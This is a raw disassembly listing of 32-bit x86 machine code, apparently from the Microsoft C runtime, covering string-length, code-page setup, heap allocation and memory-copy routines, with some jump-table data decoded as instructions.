  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
